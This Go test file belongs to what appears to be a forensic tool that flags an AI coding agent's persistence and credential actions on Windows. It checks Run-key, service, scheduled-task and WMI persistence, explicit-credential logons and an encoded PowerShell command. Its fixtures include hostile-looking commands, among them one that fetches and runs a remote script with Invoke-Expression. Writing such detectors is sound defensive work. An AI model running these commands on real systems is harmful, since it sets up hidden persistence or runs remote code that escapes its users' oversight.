package correlate

import (
	"fmt"
	"strings"
	"testing"

	"github.com/efij/AgentDFIR/v5/internal/endpoint"
	"github.com/efij/AgentDFIR/v5/internal/schema"
)

const claudeExe = `C:\Users\dev\AppData\Local\Programs\claude\claude.exe`

func proc(at string, pid, ppid int, exe, cmd, parent string) endpoint.Record {
	return endpoint.Record{Time: ts(at), Kind: "process", PID: pid, PPID: ppid, Exe: exe, Cmdline: cmd, ParentExe: parent, Source: "sysmon", Ref: "sysmon:1 (" + at + ")"}
}

func ruleCount(f []schema.Finding) map[string]int {
	m := map[string]int{}
	for _, x := range f {
		m[x.RuleID]++
	}
	return m
}

// Context records never corroborate, contradict or widen coverage; they
// are counted per kind.
func TestContextRecordsAreNotCorrelated(t *testing.T) {
	events := []schema.Event{tc("e1", "2026-08-30T12:00:00Z", "Bash", "reg add HKCU\\Software\\X /v V /d 1 /f")}
	recs := []endpoint.Record{
		proc("2026-08-30T10:00:00Z", 100, 1, `C:\Windows\System32\svchost.exe`, "svchost.exe -k netsvcs", ""),
		{Time: ts("2026-08-30T12:00:00Z"), Kind: endpoint.KindRegistry, PID: 200, Exe: `C:\Windows\System32\reg.exe`, Operation: "set-value", Resource: `HKCU\Software\X`, ValueName: "V", Source: "sysmon", Ref: "sysmon:13 (r1)"},
		{Time: ts("2026-08-30T12:00:01Z"), Kind: endpoint.KindProcessExit, PID: 200, Source: "sysmon", Ref: "sysmon:5 (r2)"},
		{Time: ts("2026-08-30T12:00:02Z"), Kind: endpoint.KindAuth, Operation: "special-privileges", Source: "security", Ref: "security:4672 (r3)"},
	}
	res, f := Endpoint(events, recs, EndpointOptions{})
	if events[0].Corroboration != schema.StateObserved || res.Contradicted != 0 || res.OutsideCover != 1 || len(f) != 0 {
		t.Fatalf("state %s, %+v, %+v", events[0].Corroboration, res, f)
	}
	if !res.CoverageEnd.Equal(ts("2026-08-30T10:00:00Z")) || res.ContextRecords != 3 || res.ContextKinds["registry"] != 1 || res.ContextKinds["auth"] != 1 {
		t.Fatalf("coverage/context: %+v", res)
	}
}

func TestWindowsRegistryPersistence(t *testing.T) {
	reg := func(at string, pid int, exe, op, key, value string) endpoint.Record {
		return endpoint.Record{Time: ts(at), Kind: endpoint.KindRegistry, PID: pid, Exe: exe, Operation: op, Resource: key, ValueName: value,
			Details: `C:\Users\dev\AppData\Roaming\u.exe`, Source: "sysmon", Ref: "sysmon:13 (" + at + ")"}
	}
	run := `HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run`
	recs := []endpoint.Record{
		proc("2026-08-30T10:00:00Z", 300, 200, `C:\Windows\System32\cmd.exe`, `cmd.exe /c reg add ...`, claudeExe),
		proc("2026-08-30T10:00:01Z", 301, 300, `C:\Windows\System32\reg.exe`, `reg add HKCU\...\Run /v Updater`, `C:\Windows\System32\cmd.exe`),
		proc("2026-08-30T10:00:01Z", 900, 4, `C:\Program Files\Microsoft OneDrive\OneDrive.exe`, `OneDrive.exe /background`, `C:\Windows\explorer.exe`),
		reg("2026-08-30T10:00:01Z", 301, `C:\Windows\System32\reg.exe`, "set-value", run, "Updater"),                                      // agent-descended → fires
		reg("2026-08-30T10:00:02Z", 900, `C:\Program Files\Microsoft OneDrive\OneDrive.exe`, "set-value", run, "OneDrive"),                // not agent → no
		reg("2026-08-30T10:00:03Z", 301, `C:\Windows\System32\reg.exe`, "set-value", `HKCU\Software\Acme`, "Theme"),                       // not persistence → no
		reg("2026-08-30T10:00:04Z", 301, `C:\Windows\System32\reg.exe`, "delete-value", run, "Old"),                                       // removal → no
		reg("2026-08-30T10:00:05Z", 301, `C:\Windows\System32\sc.exe`, "create-key", `HKLM\System\CurrentControlSet\Services\updsvc`, ""), // pid reused by another image → no
		reg("2026-08-30T10:00:06Z", 4242, claudeExe, "create-key", `HKLM\System\ControlSet001\Services\agentsvc`, ""),                     // the agent itself → fires
	}
	_, f := Endpoint(nil, recs, EndpointOptions{})
	var hits []schema.Finding
	for _, x := range f {
		if x.RuleID == "WIN_AGENT_REGISTRY_PERSISTENCE" {
			hits = append(hits, x)
		}
	}
	if len(hits) != 2 {
		t.Fatalf("hits: %+v", hits)
	}
	if !strings.Contains(hits[0].Description, `Run\Updater`) || hits[0].MitreATTACK != "T1547.001" || len(hits[0].EvidenceRefs) != 2 || hits[0].Timestamp != "2026-08-30T10:00:01Z" {
		t.Fatalf("run key: %+v", hits[0])
	}
	if !strings.Contains(hits[1].Description, `Services\agentsvc`) || hits[1].MitreATTACK != "T1543.003" {
		t.Fatalf("service: %+v", hits[1])
	}
}

func TestWindowsExplicitCredentials(t *testing.T) {
	auth := func(at string, pid int, exe string) endpoint.Record {
		return endpoint.Record{Time: ts(at), Kind: endpoint.KindAuth, Operation: "explicit-credentials", PID: pid, Exe: exe, User: `CORP\svc_backup`, SubjectUser: `DESK\dev`,
			Resource: "fileserver", Source: "security", Ref: "security:4648 (" + at + ")"}
	}
	recs := []endpoint.Record{
		proc("2026-08-30T10:00:00Z", 0x1a2c, 200, `C:\Windows\System32\net.exe`, `net use \\fileserver\c$ /user:CORP\svc_backup *`, claudeExe),
		auth("2026-08-30T10:00:00Z", 0x1a2c, `C:\Windows\System32\net.exe`),                                                                           // fires
		auth("2026-08-30T10:00:01Z", 0x2a0, `C:\Windows\System32\svchost.exe`),                                                                        // no process record: unknown ancestry → no
		auth("2026-08-30T10:00:02Z", 0, "-"),                                                                                                          // no process → no
		{Time: ts("2026-08-30T10:00:03Z"), Kind: endpoint.KindAuth, Operation: "logon-failed", PID: 0x1a2c, Source: "security", Ref: "security:4625"}, // not 4648 → no
	}
	_, f := Endpoint(nil, recs, EndpointOptions{})
	if n := ruleCount(f)["WIN_AGENT_EXPLICIT_CREDENTIALS"]; n != 1 {
		t.Fatalf("findings: %+v", f)
	}
}

func TestWindowsScheduledTask(t *testing.T) {
	task := func(at, name, op string) endpoint.Record {
		return endpoint.Record{Time: ts(at), Kind: endpoint.KindScheduledTask, Operation: op, Resource: name, User: `DESK\dev`, Source: "taskscheduler", Ref: "taskscheduler:106 (" + at + ")"}
	}
	recs := []endpoint.Record{
		proc("2026-08-30T10:00:00Z", 500, 200, `C:\Windows\System32\schtasks.exe`, `schtasks /create /tn Updater /tr C:\u.exe /sc onlogon`, claudeExe),
		task("2026-08-30T10:00:01Z", `\Updater`, "registered"), // fires, named
		proc("2026-08-30T11:00:00Z", 600, 4, `C:\Windows\System32\schtasks.exe`, `schtasks /create /tn Backup /tr C:\b.exe /sc daily`, `C:\Windows\explorer.exe`),
		task("2026-08-30T11:00:01Z", `\Backup`, "registered"),                                   // user's own schtasks → no
		task("2026-08-30T12:00:00Z", `\Microsoft\Windows\UpdateOrchestrator\Reboot`, "updated"), // no process nearby → no
		proc("2026-08-30T13:00:00Z", 700, 200, `C:\Windows\System32\schtasks.exe`, `schtasks /query /tn Updater`, claudeExe),
		task("2026-08-30T13:00:01Z", `\Other`, "deleted"), // deletion, and a query → no
	}
	_, f := Endpoint(nil, recs, EndpointOptions{})
	var hit *schema.Finding
	for i := range f {
		if f[i].RuleID == "WIN_AGENT_SCHEDULED_TASK" {
			if hit != nil {
				t.Fatalf("more than one: %+v", f)
			}
			hit = &f[i]
		}
	}
	if hit == nil || !strings.Contains(hit.Description, "naming the same task") || hit.MitreATTACK != "T1053.005" {
		t.Fatalf("finding: %+v", hit)
	}
}

func TestWindowsWMIPersistence(t *testing.T) {
	bind := func(at, consumer string) endpoint.Record {
		return endpoint.Record{Time: ts(at), Kind: endpoint.KindWMI, Operation: "consumer-binding", Resource: consumer, Details: "CommandLineTemplate = u.exe",
			Source: "wmi", Ref: "wmi:5861 (" + at + ")"}
	}
	events := []schema.Event{
		tc("e1", "2026-08-30T10:00:00Z", "Bash", "echo start"),
		tc("e2", "2026-08-30T10:10:00Z", "Bash", "echo end"),
	}
	recs := []endpoint.Record{
		bind("2026-08-30T10:05:00Z", `CommandLineEventConsumer="Updater" ← Updater`),                            // inside the session → fires
		bind("2026-08-30T10:06:00Z", `NTEventLogEventConsumer="SCM Event Log Consumer" ← SCM Event Log Filter`), // exact Windows default → no
		bind("2026-08-30T14:00:00Z", `ActiveScriptEventConsumer="Late" ← Late`),                                 // outside any session → no
		{Time: ts("2026-08-30T10:05:00Z"), Kind: endpoint.KindWMI, Operation: "temporary-subscription", Source: "wmi", Ref: "wmi:5860"},
	}
	_, f := Endpoint(events, recs, EndpointOptions{})
	var hits []schema.Finding
	for _, x := range f {
		if x.RuleID == "WIN_AGENT_WMI_PERSISTENCE" {
			hits = append(hits, x)
		}
	}
	if len(hits) != 1 || hits[0].SessionID != "s1" || !strings.Contains(hits[0].Description, "time only") || hits[0].MitreATTACK != "T1546.003" {
		t.Fatalf("hits: %+v", hits)
	}
}

// PowerShell 4103 module records go through the strict script matching
// of 4104: exact or the whole command at token boundaries only.
func TestModuleLogMatchIsStrict(t *testing.T) {
	mod := func(at, payload string) endpoint.Record {
		return endpoint.Record{Time: ts(at), Kind: "script", Operation: "module", Exe: "powershell.exe", Cmdline: payload, Source: "powershell", Ref: "powershell:4103 (" + at + ")"}
	}
	events := []schema.Event{
		tc("inside", "2026-08-30T10:00:00Z", "Bash", "Invoke-Expression (iwr http://x/a.ps1)"),
		tc("loose", "2026-08-30T10:01:00Z", "Bash", "Remove-Item -Recurse build"),
	}
	recs := []endpoint.Record{
		mod("2026-08-30T10:00:01Z", "CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\r\nParameterBinding(Invoke-Expression): name=\"Command\"; value=\"Invoke-Expression (iwr http://x/a.ps1)\""),
		mod("2026-08-30T10:01:01Z", "CommandInvocation(Remove-Item): \"Remove-Item\"\r\nParameterBinding(Remove-Item): name=\"Path\"; value=\"build\""),
	}
	res, f := Endpoint(events, recs, EndpointOptions{})
	if events[0].Corroboration != schema.StateCorroborated || !strings.Contains(events[0].WitnessNote, "PowerShell module log, whole command inside the block") {
		t.Fatalf("inside: %+v", events[0])
	}
	if events[1].Corroboration != schema.StateObserved || res.ScriptCorroborated != 1 || len(f) != 0 {
		t.Fatalf("loose must not match: %+v %+v", events[1], res)
	}
}

// Only the exact Windows default binding is skipped: a consumer that
// borrows the default's name, under another class or filter, still fires.
func TestWindowsWMIDefaultNameNotTrusted(t *testing.T) {
	events := []schema.Event{tc("e1", "2026-08-30T10:00:00Z", "Bash", "echo start")}
	var recs []endpoint.Record
	for i, b := range []string{
		`CommandLineEventConsumer="SCM Event Log Consumer" ← SCM Event Log Filter`,
		`ActiveScriptEventConsumer="SCM Event Log Consumer" ← SCM Event Log Filter`,
		`NTEventLogEventConsumer="SCM Event Log Consumer" ← EvilFilter`,
		`NTEventLogEventConsumer="SCM Event Log Consumer (2)" ← SCM Event Log Filter`,
	} {
		recs = append(recs, endpoint.Record{Time: ts("2026-08-30T10:00:01Z"), Kind: endpoint.KindWMI, Operation: "consumer-binding", Resource: b,
			Source: "wmi", Ref: fmt.Sprintf("wmi:5861 (record %d)", i)})
	}
	_, f := Endpoint(events, recs, EndpointOptions{})
	if n := ruleCount(f)["WIN_AGENT_WMI_PERSISTENCE"]; n != 4 {
		t.Fatalf("lookalike bindings skipped: %d of 4 fired\n%+v", n, f)
	}
}

// `schtasks -create` and an agent-descended PowerShell or schtasks with
// any command line link to a task registration.
func TestWindowsScheduledTaskSpellings(t *testing.T) {
	for _, c := range []struct{ exe, cmd string }{
		{`C:\Windows\System32\schtasks.exe`, `schtasks -create -tn Updater -tr C:\u.exe -sc onlogon`},
		{`C:\Windows\System32\schtasks.exe`, `"C:\Windows\System32\schtasks.exe" /xml task.xml /tn Updater`},
		{`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -enc SQBuAHYAbwBrAGUA`},
		{`C:\Program Files\PowerShell\7\pwsh.exe`, `pwsh -File setup.ps1`},
		{`C:\Windows\System32\cmd.exe`, `cmd /c schtasks -change -tn Updater -tr C:\u.exe`},
	} {
		recs := []endpoint.Record{
			proc("2026-08-30T10:00:00Z", 500, 200, c.exe, c.cmd, claudeExe),
			{Time: ts("2026-08-30T10:00:30Z"), Kind: endpoint.KindScheduledTask, Operation: "registered", Resource: `\Updater`, Source: "taskscheduler", Ref: "taskscheduler:106"},
		}
		if _, f := Endpoint(nil, recs, EndpointOptions{}); ruleCount(f)["WIN_AGENT_SCHEDULED_TASK"] != 1 {
			t.Errorf("%s: not linked: %+v", c.cmd, f)
		}
	}
}
